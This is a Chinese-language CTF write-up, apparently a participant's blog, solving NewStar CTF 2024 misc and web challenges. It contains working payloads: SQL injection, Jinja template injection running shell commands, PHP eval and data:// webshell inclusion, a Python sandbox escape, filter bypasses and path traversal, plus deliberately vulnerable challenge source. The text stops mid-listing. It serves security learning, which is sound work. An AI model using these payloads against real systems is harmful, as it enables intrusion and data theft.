---
title: new star CTF
date: 2024-09-30 14:11:40
tags: 复现
categories: 比赛复现
---

## MISC

### 兑换码

![image-20240930141234298](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301412421.png)

题目提示flag在图片下面，我们用010打开图片修改高度

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/8e66b5268864fb07085024ce800fdf1b.png)

![image-20240930141330112](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301413274.png)

我们将04修改为05，就能在图片下面找到flag了

![image-20240930141419765](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301414013.png)



## Web

### week1

### headach3

我们打开页面，发现页面连接已重置

我们用curl命令打开网站

```
curl -i http://eci-2zegoa69kgaljcwwcz37.cloudeci1.ichunqiu.com:80
```

得到flag

![image-20240930145400657](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301454803.png)

### 会赢吗

![image-20240930142114529](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301421969.png)

页面需要我们找到录取通知书，我们打开源码进行查看，发现第一个flag和下一个网页

![image-20240930142152736](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301421842.png)

```
flag第一部分：ZmxhZ3tXQTB3
```

![image-20240930142847939](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301428405.png)

第二个提示我们跟js有关，我们查看控制台

![image-20240930142927178](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301429245.png)

提示课程名称叫4cqu1siti0n

我们查看js代码

![image-20240930143011162](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301430261.png)

我们要往revealFlag中传入课程名，我们已知课程名，直接传

![image-20240930143111099](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301431218.png)

得到第二部分flag和下一个地方

```
flag第一部分：ZmxhZ3tXQTB3
flag第二部分：IV95NF9yM2Fs
```

![image-20240930143611451](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301436674.png)

这一关要我们进行解封，我们查看js代码

![image-20240930143643921](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301436004.png)

它需要state id标签的值为解封，我们直接修改为解封，得到第三部分

![image-20240930143748789](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301437858.png)

```
flag第一部分：ZmxhZ3tXQTB3
flag第二部分：IV95NF9yM2Fs
flag第三部分：MXlfR3I0c1B
```

![image-20240930143911204](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301439495.png)

点击会赢的，弹出提示要他的领域失效，我们直接禁用js

![image-20240930144032712](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301440924.png)

再次点击，得到最后的flag

![image-20240930144103139](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301441213.png)

```
flag第一部分：ZmxhZ3tXQTB3
flag第二部分：IV95NF9yM2Fs
flag第三部分：MXlfR3I0c1B
4：fSkpKcyF9
```

我们连起来进行base64解码

得到flag

### 智械危机

题目提示有个后门，我们打开robots.txt，发现有个文件，我们访问

```
<?php

function execute_cmd($cmd) {
    system($cmd);
}

function decrypt_request($cmd, $key) {
    $decoded_key = base64_decode($key);
    $reversed_cmd = '';
    for ($i = strlen($cmd) - 1; $i >= 0; $i--) {
        $reversed_cmd .= $cmd[$i];
    }
    $hashed_reversed_cmd = md5($reversed_cmd);
    if ($hashed_reversed_cmd !== $decoded_key) {
        die("Invalid key");
    }
    $decrypted_cmd = base64_decode($cmd);
    return $decrypted_cmd;
}

if (isset($_POST['cmd']) && isset($_POST['key'])) {
    execute_cmd(decrypt_request($_POST['cmd'],$_POST['key']));
}
else {
    highlight_file(__FILE__);
}
?>
```

进行代码审计

execute_cmd用来执行命令

我们重点来看decrypt_request

首先将key进行base64解码，然后将cmd逆向进入reversed_cmd

然后将reversed_cmd进行md5加密，再判断hashed_reversed_cmd是否和decoded_key的md5相等，最后再讲cmd进行base64解码，返回这个值

所以我们的思路是先构造好cmd命令，再将其进行base64加密，就是我们要传的cmd参数

key的话，要先将cmd的base64加密的值进行逆向再md5加密

写个加密小脚本

```
<?php
$cmd=base64_encode("ls");
echo "cmd=",$cmd,PHP_EOL;
$key=strrev($cmd);
echo "key=",base64_encode( md5($key));
?>
```

我们进行传参

```
cmd=bHM=  //ls
key=N2FiZThiMjRiZDAxMzc0NDZmZDMzNmMyMjk4ZmNjYTA=
```

![image-20240930215101248](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409302151360.png)



成功，然后就是找flag文件位置

```
ls ../../../
```

最后就是输出flag

```
cat ../../../flag
```

具体操作跟上面一样



### 谢谢皮蛋

sql注入的题，源码给了提示，访问/hint.php，有sql注入语句

![image-20240930215841674](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409302158759.png)

我们进行sql注入

```
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

![image-20240930215859846](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409302158871.png)

```
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='Fl4g'#
```

![image-20240930215927084](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409302159107.png)

```
-1 union select 1,group_concat(id,des,value) from Fl4g#
```

![image-20240930220043490](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409302200568.png)



### PangBai 过家家（1）

我们打开页面，提示头部存在一些东西

![image-20241004180732002](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041807067.png)

我们进行抓包，发现有个新的文件，我们访问

![image-20241004180806971](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041808106.png)

然后我们得到下一关的cookie

![image-20241004182040952](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041820015.png)

我们替换cookie进行访问，进入第二关

![image-20241004182816808](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041828870.png)

第二关提示需要我们ask=miao，我们进行传参

```
?ask=miao
```

![image-20241004182907938](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041829097.png)

得到第三关的cookie

第三关提示要我们用post传参

![image-20241004182943207](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041829411.png)

我们传完后，得到第四关的cookie

![image-20241004183535262](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041835340.png)

第四关提示我们修改代理人为Papa

![image-20241004183604662](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041836740.png)

我们将User-Agent的Safari修改为Papa

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Papa/537.36
```

![image-20241004193648172](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041936433.png)

然后提示我们说玛卡巴卡阿卡哇卡米卡玛卡呣

我们修改say为这个值，得到下一关的cookie

![image-20241004193739242](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410041937338.png)

下一关要求我们用修改（PATCH）的方法提交一个补丁包name="file"; filename="*.zip"

我们用postman做

我们将content-type改为from-data

然后上传文件，再添加say为玛卡巴卡阿卡哇卡米卡玛卡呣

![image-20241006195529753](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410061955818.png)

就进入了下一关，页面提示localhost，我们修改xff为127.0.0.1

![image-20241006195614539](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410061956748.png)

得到了jwt的密钥，我们修改关卡为第0关（因为没找到第七关）

![image-20241006195653460](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410061956512.png)

再在网页修改cookie

进入第0关

![image-20241006195726115](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410061957226.png)



我们点击从梦中醒来，过完剧情就得到了flag（歌挺好听的，真不容易啊）

![image-20241006195918946](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410061959049.png)

### week2

### 复读机

![image-20241006214534903](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062145938.png)

我们发现这是一个ssti模版注入的题

但经过我们测试，过滤了class

一旦提交包含class的字符串

bot就会报错

![image-20241006214640452](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062146532.png)

那我们就不使用包含class的ssti注入语句

```
{%print lipsum.__globals__['__builtins__']['__import__']('os')['popen']('whoami').read()%}
```

![image-20241006220733033](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062207070.png)

成功读取到用户名

```
{%print lipsum.__globals__['__builtins__']['__import__']('os')['popen']('cat ..').read()%}
```

![image-20241006220823675](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062208759.png)

### 你能在一秒内打出八句英文吗

![image-20241007184354556](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410071844731.png)



这个题让我们在一秒内打出八句英文，显然我们人力是不可能做到的，所以我们使用python 的requests来提交

由于英文在/start下，我们用BeautifulSoup获取id=text标签名

![image-20241007184600065](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410071846155.png)

然后我们进行抓包发现，表格提交到/sumbit下，那我们就能写脚本了

```
import requests
from bs4 import BeautifulSoup
url="http://eci-2zedc18yc0kuhpbs5row.cloudeci1.ichunqiu.com/start"
session=requests.session()
r=session.get(url)
soup=BeautifulSoup(r.text,"html.parser")
text_content = soup.find(id="text").get_text()
print(r.text)
data={

    "user_input":text_content
}
print(text_content)
url="http://eci-2zedc18yc0kuhpbs5row.cloudeci1.ichunqiu.com/submit"
r=session.post(url,data=data)
print(r.text)
```

得到flag

![image-20241007184657869](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410071846904.png)



### 谢谢皮蛋 plus

![image-20241008214410173](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410082144396.png)

经过测试，过滤了空格和and，我们使用联合注入

具体的自己写

```
-1"/**/union/**/select/**/group_concat(id,des,value),1/**/from/**/Fl4g#
```



### 遗失的拉链

我们扫描目录，发现有个www.zip文件

```
<?php
error_reporting(0);
//for fun
if(isset($_GET['new'])&&isset($_POST['star'])){
    if(sha1($_GET['new'])===md5($_POST['star'])&&$_GET['new']!==$_POST['star']){
        //欸 为啥sha1和md5相等呢
        $cmd = $_POST['cmd'];
        if (preg_match("/cat|flag/i", $cmd)) {
            die("u can not do this ");
        }
        echo eval($cmd);
    }else{
        echo "Wrong";

    } 
}
```

进行代码审计，主要要绕过这个语句

```
if(sha1($_GET['new'])===md5($_POST['star'])&&$_GET['new']!==$_POST['star'])
```

我们使用数组绕过

```
?new[]=1

star[]=2
```

绕过后我们进行命令执行，由于eval前面有个echo

我们需要eval里的是文本，那我们就使用print_r加上`来执行命令

```
cmd=print_r(`tac /f*`)
```

得到flag

![image-20241009221144583](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410092211659.png)

### PangBai 过家家（2）

![image-20241018200037552](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410182000590.png)

第一关让我们清点泄漏的文件，那不就是.git文件吗

我们利用GitHack工具把文件夹下载下来

![image-20241018203939053](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410182039114.png)

我们使用git命令查看当前项目信息，使用

git log --stat

查看提交历史

![image-20241018204037996](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410182040051.png)

使用 `git reset HEAD~1` 可以回到上一个 Commit，或者直接使用 VSCode 打开泄露出来的 Git 存储库，能够更可视化地查看提交历史。但没什么用

我们查看Stash

```
git stash list
```

我们可以看到 Stash 中含有后门（实际上在 GitHacker 泄漏时就有 stash 的输出信息）

![image-20241018204246522](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410182042559.png)

> Stash 的作用
>
> 有时会遇到这样的情况，我们正在 dev 分支开发新功能，做到一半时有人过来反馈一个 bug，让马上解决，但是又不方便和现在已经更改的内容混杂在一起，这时就可以使用 `git stash` 命令先把当前进度保存起来。随后便可以即时处理当前要处理的内容。使用 `git stash pop` 则可以将之前存储的内容重新恢复到工作区。
>
> 又或者，我们已经在一个分支进行了修改，但发现自己修改错了分支，可以通过 Stash 进行存储，然后到其它分支中释放。
>
> 一些常见的 Stash 命令如：
>
> - `git stash`
>
>   保存当前工作进度，会把暂存区和工作区的改动保存起来。执行完这个命令后，在运行 `git status` 命令，就会发现当前是一个干净的工作区，没有任何改动。使用 `git stash save '一些信息'` 可以添加一些注释。
>
> - `git stash pop [-index] [stash_id]`
>
>   从 Stash 中释放内容，默认为恢复最新的内容到工作区。

使用 `git stash pop` 恢复后门文件到工作区。

![image-20241018204341193](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410182043243.png)

发现了后门文件BacKd0or.v2d23AOPpDfEW5Ca.php

我们进行访问，来到第二关

![image-20241018204426356](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410182044398.png)



由于git stash pop将后门释放出去了，我们可以直接查看源码

```
<?php

# Functions to handle HTML output

function print_msg($msg) {
    $content = file_get_contents('index.html');
    $content = preg_replace('/\s*<script.*<\/script>/s', '', $content);
    $content = preg_replace('/ event/', '', $content);
    $content = str_replace('点击此处载入存档', $msg, $content);
    echo $content;
}

function show_backdoor() {
    $content = file_get_contents('index.html');
    $content = str_replace('/assets/index.4f73d116116831ef.js', '/assets/backdoor.5b55c904b31db48d.js', $content);
    echo $content;
}

# Backdoor

if ($_POST['papa'] !== 'TfflxoU0ry7c') {
    show_backdoor();
} else if ($_GET['NewStar_CTF.2024'] !== 'Welcome' && preg_match('/^Welcome$/', $_GET['NewStar_CTF.2024'])) {
    print_msg('PangBai loves you!');
    call_user_func($_POST['func'], $_POST['args']);
} else {
    print_msg('PangBai hates you!');
}

```

```
if ($_GET['NewStar_CTF.2024'] !== 'Welcome' && preg_match('/^Welcome$/', $_GET['NewStar_CTF.2024'])) {
    print_msg('PangBai loves you!');
```

我们主要来看这个正则匹配，对于这个表达式，可以使用换行符绕过。`preg_match` 默认为单行模式（此时 `.` 会匹配换行符），但在 PHP 中的该模式下，`$` 除了匹配整个字符串的结尾，还能够匹配字符串最后一个换行符。

拓展

如果加 `D` 修饰符，就不匹配换行符：

```
preg_match('/^Welcome$/D', "Welcome\n")
```

但当我们传入NewStar_CTF.2024=Welcome%0a又不能通过了呢，因为这是由 `NewStar_CTF.2024` 中的特殊字符 `.` 引起的，PHP 默认会将其解析为 `NewStar_CTF_2024`. 在 PHP 7 中，可以使用 `[` 字符的非正确替换漏洞。当传入的参数名中出现 `[` 且之后没有 `]` 时，PHP 会将 `[` 替换为 `_`，但此之后就不会继续替换后面的特殊字符了，因此，GET 传参 `NewStar[CTF.2024=Welcome%0a` 即可，随后传入 `call_user_func` 的参数即可

```
?NewStar[CTF.2024=Welcome%0a
papa=TfflxoU0ry7c&func=system&args=env|grep FLAG
```

![image-20241018211051943](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410182110984.png)

### week3

### Include Me

```
<?php
highlight_file(__FILE__);
function waf(){
    if(preg_match("/<|\?|php|>|echo|filter|flag|system|file|%|&|=|`|eval/i",$_GET['me'])){
        die("兄弟你别包");
    };
}
if(isset($_GET['phpinfo'])){
    phpinfo();
}

//兄弟你知道了吗？
if(!isset($_GET['iknow'])){
    header("Refresh: 5;url=https://cn.bing.com/search?q=php%E4%BC%AA%E5%8D%8F%E8%AE%AE");
}

waf();
include $_GET['me'];
echo "兄弟你好香";
?>
```

我们需要将iknow传个值，不然会一直跳转到别的网页

从waf看，题目没有过滤data，那我们可以使用data伪协仪

```
GET /?iknow=1&me=data:text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzBdKT8+%2B HTTP/1.1
<?php @eval($_POST[0])?> 的 Base64 加密结果为 PD9waHAgQGV2YWwoJF9QT1NUWzBdKT8+，加号作转义
```

> 需要注意的是，base64加密后不能出现=号
>
> 当base64加密后的字符串以'+'结尾，我们需要在气候加上%2B，不然网页会把它解析为空格



### 臭皮的计算机

我们进入/calc后打开网页源代码，里面有源码

```
 from flask import Flask, render_template, request
import uuid
import subprocess
import os
import tempfile

app = Flask(__name__)
app.secret_key = str(uuid.uuid4())

def waf(s):
    token = True
    for i in s:
        if i in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
            token = False
            break
    return token

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/calc", methods=['POST', 'GET'])
def calc():
    
    if request.method == 'POST':
        num = request.form.get("num")
        script = f'''import os
print(eval("{num}"))
'''
        print(script)
        if waf(num):
            try:
                result_output = ''
                with tempfile.NamedTemporaryFile(mode='w+', suffix='.py', delete=False) as temp_script:
                    temp_script.write(script)
                    temp_script_path = temp_script.name

                result = subprocess.run(['python3', temp_script_path], capture_output=True, text=True)
                os.remove(temp_script_path)

                result_output = result.stdout if result.returncode == 0 else result.stderr
            except Exception as e:

                result_output = str(e)
            return render_template("calc.html", result=result_output)
        else:
            return render_template("calc.html", result="臭皮！你想干什么！！")
    return render_template("calc.html", result='试试呗')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=30002)
```

我们发现它过滤了字母，而且存在eval，能够用来进行命令执行

我们使用**全角英文**和 `chr()` 字符拼接（或八进制）即可绕过

```
_＿ｉｍｐｏｒｔ_＿(ｃｈｒ(111)+ｃｈｒ(115)).ｓｙｓｔｅｍ(ｃｈｒ(99)+ｃｈｒ(97)+ｃｈｒ(116)+ｃｈｒ(32)+ｃｈｒ(47)+ｃｈｒ(102)+ｃｈｒ(108)+ｃｈｒ(97)+ｃｈｒ(103))

__impoirt__(os.system(cat /flag))

```

用bp发包时，要注意对+进行转义，或者直接写到提交框里

### 臭皮踩踩背

题目需要用nc连接，给出了部分源码

```
def ev4l(*args):
    print(secret)
inp = input("> ")
f = lambda: None
print(eval(inp, {"__builtins__": None, 'f': f, 'eval': ev4l}))
```

完整源码（wp给的）：

```
print('你被豌豆关在一个监狱里……')
print('豌豆百密一疏，不小心遗漏了一些东西…')
print('''def ev4l(*args):\n\tprint(secret)\ninp = input("> ")\nf = lambda: None\nprint(eval(inp, {"__builtins__": None, 'f': f, 'eval': ev4l}))''')
print('能不能逃出去给豌豆踩踩背就看你自己了，臭皮…')

def ev4l(*args):
    print(secret)

secret = '你已经拿到了钥匙，但是打开错了门，好好想想，还有什么东西是你没有理解透的？'

inp = input("> ")

f = lambda: None

if "f.__globals__['__builtins__'].eval" in inp:
    f.__globals__['__builtins__'].eval = ev4l
else:
    f.__globals__['__builtins__'].eval = eval

try:
    print(eval(inp, {"__builtins__": None, 'f': f, 'eval': ev4l}))
except Exception as e:
    print(f"Error: {e}")
```



我们来看看内建函数__builtins\_\_,还有globals是什么，再了解eval()的原理

#### globals 和 builtins

globals是我们当前的全局变量，如果你声明一个全局变量，它将会存在于当前的globals中，我们可以看一下globals中到底有哪些内容，我们创建一个python会话

```
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}
>>> x=1
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'x': 1}
```

但是为什么我们能够直接调用open()函数呢？因为 。但是如果访问了 `open` 函数，如果 `globals` 中有，那就执行 `globals` 中的（可能是你自己定义的，因此存在于 `globals` 空间中），否则，执行 `builtins` 中的（类似 `open` `eval` `__import__` 之类的函数都是在 `builtins` 中的）。

我们来看看builtins中有什么

```
>>> globals()['__builtins__'].__dict__.keys()
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__build_class__', '__import__', 'abs', 'all', 'any', 'ascii', 'bin', 'breakpoint', 'callable', 'chr', 'compile', 'delattr', 'dir', 'divmod', 'eval', 'exec', 'format', 'getattr', 'globals', 'hasattr', 'hash', 'hex', 'id', 'input', 'isinstance', 'issubclass', 'iter', 'aiter', 'len', 'locals', 'max', 'min', 'next', 'anext', 'oct', 'ord', 'pow', 'print', 'repr', 'round', 'setattr', 'sorted', 'sum', 'vars', 'None', 'Ellipsis', 'NotImplemented', 'False', 'True', 'bool', 'memoryview', 'bytearray', 'bytes', 'classmethod', 'complex', 'dict', 'enumerate', 'filter', 'float', 'frozenset', 'property', 'int', 'list', 'map', 'object', 'range', 'reversed', 'set', 'slice', 'staticmethod', 'str', 'super', 'tuple', 'type', 'zip', '__debug__', 'BaseException', 'Exception', 'TypeError', 'StopAsyncIteration', 'StopIteration', 'GeneratorExit', 'SystemExit', 'KeyboardInterrupt', 'ImportError', 'ModuleNotFoundError', 'OSError', 'EnvironmentError', 'IOError', 'WindowsError', 'EOFError', 'RuntimeError', 'RecursionError', 'NotImplementedError', 'NameError', 'UnboundLocalError', 'AttributeError', 'SyntaxError', 'IndentationError', 'TabError', 'LookupError', 'IndexError', 'KeyError', 'ValueError', 'UnicodeError', 'UnicodeEncodeError', 'UnicodeDecodeError', 'UnicodeTranslateError', 'AssertionError', 'ArithmeticError', 'FloatingPointError', 'OverflowError', 'ZeroDivisionError', 'SystemError', 'ReferenceError', 'MemoryError', 'BufferError', 'Warning', 'UserWarning', 'EncodingWarning', 'DeprecationWarning', 'PendingDeprecationWarning', 'SyntaxWarning', 'RuntimeWarning', 'FutureWarning', 'ImportWarning', 'UnicodeWarning', 'BytesWarning', 'ResourceWarning', 'ConnectionError', 'BlockingIOError', 'BrokenPipeError', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionRefusedError', 'ConnectionResetError', 'FileExistsError', 'FileNotFoundError', 'IsADirectoryError', 'NotADirectoryError', 'InterruptedError', 'PermissionError', 'ProcessLookupError', 'TimeoutError', 'open', 'quit', 'exit', 'copyright', 'credits', 'license', 'help', '_'])
```

可以看到 `open` `eval` `__import__` 等函数都在 `builtins` 中。

#### eval

`eval` 函数的第一个参数就是一个字符串，即你要执行的 Python 代码，第二个参数就是一个字典，指定在接下来要执行的代码的上下文中，`globals` 是怎样的。

题目中，`eval(inp, {"__builtins__": None, 'f': f, 'eval': ev4l})` 这段代码，`__builtins__` 被设置为 `None`，而我们输入的代码就是在这个 `builtins` 为 `None` 的上下文中执行的，我们从而失去了直接使用 `builtins` 中的函数的能力，像下面的代码就会报错（题目中直接输入 `print(1)`）：

python

```
>>> eval('print(1)', {"__builtins__": None})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
TypeError: 'NoneType' object is not subscriptable
```

由于全局 `global` 中没有 `print`，从而从 `builtins` 中寻找，而 `builtins` 为 `None`，触发错误。

但注意看，题目刚好给了一个匿名函数 `f`，看似无用，实际上参考文档已经给出提示——**Python 中「一切皆对象」**。故可以利用函数对象的 `__globals__` 属性来逃逸。我们可以在 Python 终端测试一下：

python

```
>>> f = lambda: None
>>> f.__globals__
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'f': <function <lambda> at 0x0000026073850700>}
```

函数的 `__globals__` 记录的是这个函数所在的 `globals` 空间，而这个 `f` 函数是在题目源码的环境中（而不是题目的 eval 的沙箱中），我们从而获取到了原始的 `globals` 环境，然后我们便可以从这个原始 `globals` 中获取到原始 `builtins`：

python

```
f.__globals__['__builtins__']
```

#### 深入探究 eval 的 builtin 逻辑

但这里还有一个问题，如果我们直接调用 `f.__globals__['__builtins__'].eval`，先不说题目会替换掉 `eval` 函数（实际上在点号前随便几个空格或者字符串拼接就能绕过，下不赘述），即使我们能够调用，也会报错：

python

```
>>> f = lambda: None
>>> inp='''f.__globals__['__builtins__'].eval('print(1)')'''
>>> eval(inp, {"__builtins__": None, 'f': f})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
  File "<string>", line 1, in <module>
TypeError: 'NoneType' object is not subscriptable
```

为什么呢？可以看 Python 解释器的 `builtins` 相关的代码：[ bltinmodule.c](https://github.com/python/cpython/blob/079875e39589eb0628b5883f7ffa387e7476ec06/Python/bltinmodule.c#L996-L1002).

![bltinmodule.c](https://ns.openctf.net/assets/caicaibei_1.D2AU5_8T.png)

可见，会检查 `globals` 中是否已经包含了 `builtins`，如果没有，则会通过 `PyEval_GetBuiltins()` 获取默认的内置函数，并将其添加到 `globals` 中。

又因为[官方文档中对 `eval` 函数的描述](https://docs.python.org/3.10/library/functions.html#eval)：

![官方文档](https://ns.openctf.net/assets/caicaibei_2.DF8ath1m.png)

因此，报错的原因便是，我们在 `inp` 中的 `eval` 并没有指定 `globals`，因此 Python 会将**当前调用处的上下文的 `globals`** 作为第二个参数，即使设定了第二个参数但没有指定 `__builtins__`，Python 也会自动注入**当前上下文**中的 `builtins`（也就是未指定则继承）。但当前上下文中的 `builtins` 是 `None`，因此会报错。

绕过也很简单，显式指定即可：

python

```
>>> inp='''f.__globals__['__builtins__'].eval('print(1)', { "__builtins__": f.__globals__['__builtins__'] })'''
>>> eval(inp, {"__builtins__": None, 'f': f})
```

可以看下面的结构树：

python

```
# In source code
globals()               <- f.__globals__
  ├─ __builtins__       <- f.__globals__['__builtins__']
  │  ├─ open            <- f.__globals__['__builtins__'].open
  │  ├─ eval            <- f.__globals__['__builtins__'].eval
  │  └─ ...
  ├─ f                  <- f.__globals__['f']
  └─ ...
    # In `eval(inp, {"__builtins__": None, "f": f})`
    globals()
      ├─ __builtins__   <- None
      ├─ f
      └─ ...
      # Though `f` was from top globals, and you can reach top builtins by `f.__globals__['__builtins__']`
      # the context is still at this level when you run `eval()` AKA `f.__globals__['__builtins__'].eval()`
      # so Python will inject the current builtins, which is `None`, into the `eval` context
```

#### Payload

```
通过读文件 f.__globals__['__builtins__'].open('/flag').read()

通过代码执行 f.__globals__['__builtins__'] .eval('open("/flag").read()', { "__builtins__": f.__globals__['__builtins__'] })

通过命令执行 f.__globals__['__builtins__'].__import__('os').popen('cat /flag').read()
```

### 这照片是你吗

```
<!-- 图标能够正常显示耶! -->
<!-- 但是我好像没有看到 Niginx 或者 Apache 之类的东西 -->
<!-- 说明服务器脚本能够处理静态文件捏 -->
<!-- 那源码是不是可以用某些办法拿到呢! -->
```

根据提示，我们可以获得静态文件，但是没有常见的反代服务来区别静态文件和服务型路由

服务端处理文件和路由的逻辑很有可能有漏洞

简单的测试我们能发现目录穿越和任意文件读取

查看 Response Header，能够认出来是 Flask app，常用的 Flask 主程序名为为 `app.py`.

目录穿越常用../来返回文件上一层

本题将静态文件存储再来./static中，主程序在static外，那么使用/../app.py就可以读取到文件源码

> 但需要注意的是若直接在浏览器中访问带 `../` 的路径，会先被浏览器按照网址路径规则解析一遍 `../`，最终发出的并不是含这个字符串的路径，因此需要用发包软件发送过去。

```
from flask import Flask, make_response, render_template_string, request, redirect, send_file
import uuid
import jwt
import time

import os
import requests

from flag import get_random_number_string

base_key = str(uuid.uuid4()).split("-")
secret_key = get_random_number_string(6)
admin_pass = "".join([ _ for _ in base_key])

print(admin_pass)

app = Flask(__name__)
failure_count = 0

users = {
    'admin': admin_pass,
    'amiya': "114514"
}

def verify_token(token):
    try:
        global failure_count
        if failure_count >= 100:
            return make_response("You have tried too many times! Please restart the service!", 403)
        data = jwt.decode(token, secret_key, algorithms=["HS256"])
        if data.get('user') != 'admin':
            failure_count += 1
            return make_response("You are not admin!<br><img src='/3.png'>", 403)
    except:
        return make_response("Token is invalid!<br><img src='/3.png'>", 401)
    return True

@app.route('/')
def index():
    return redirect("/home")

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    global failure_count
    if failure_count >= 100:
        return make_response("You have tried too many times! Please restart the service!", 403)
    if users.get(username)==password:
        token = jwt.encode({'user': username, 'exp': int(time.time()) + 600}, secret_key)
        response = make_response('Login success!<br><a href="/home">Go to homepage</a>')
        response.set_cookie('token', token)
        return response
    else:
        failure_count += 1
    return make_response('Could not verify!<br><img src="/3.png">', 401)

@app.route('/logout')
def logout():
    response = make_response('Logout success!<br><a href="/home">Go to homepage</a>')
    response.set_cookie('token', '', expires=0)
    return response

@app.route('/home')
def home():
    logged_in = False
    try:
        token = request.cookies.get('token')
        data = jwt.decode(token, secret_key, algorithms=["HS256"])
        text = "Hello, %s!" % data.get('user')
        logged_in = True
    except:
        logged_in = False
        text = "You have not logged in!"
        data = {}
    return render_template_string(r'''
       
    ''', text=text, logged_in=logged_in, user=data.get('user'))

@app.route('/admin')
def admin():
    try:
        token = request.cookies.get('token')
        if verify_token(token) != True:
            return verify_token(token)
        resp_text = render_template_string(r'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Panel</title>
            </head>
            <body>
                <h1>Admin Panel</h1>
                <p>GET Server Info from api:</p>
                <input type="input" value={{api_url}} id="api" readonly>
                <button onclick=execute()>Execute</button>
                <script>
                    function execute() {
                        fetch("{{url}}/execute?api_address="+document.getElementById("api").value,
                                      {credentials: "include"}
                                      ).then(res => res.text()).then(data => {
                            document.write(data);
                        });
                    }
                </script>
            </body>
            </html>
        ''', api_url=request.host_url+"/api", url=request.host_url)
        resp = make_response(resp_text)
        resp.headers['Access-Control-Allow-Credentials'] = 'true'
        return resp
    except:
        return make_response("Token is invalid!<br><img src='/3.png'>", 401)

@app.route('/execute')
def execute():
    token = request.cookies.get('token')
    if verify_token(token) != True:
        return verify_token(token)
    api_address = request.args.get("api_address")
    if not api_address:
        return make_response("No api address!", 400)
    response = requests.get(api_address, cookies={'token': token})
    return response.text

@app.route("/api")
def api():
    token = request.cookies.get('token')
    if verify_token(token) != True:
        return verify_token(token)
    resp = make_response(f"Server Info: {os.popen('uname -a').read()}")
    resp.headers['Access-Control-Allow-Credentials'] = 'true'
    return resp


@app.route("/<path:file>")
def static_file(file):
    print(file)
    restricted_keywords = ["proc", "env", "passwd", "shadow", "hosts", "sys", "log", "etc", 
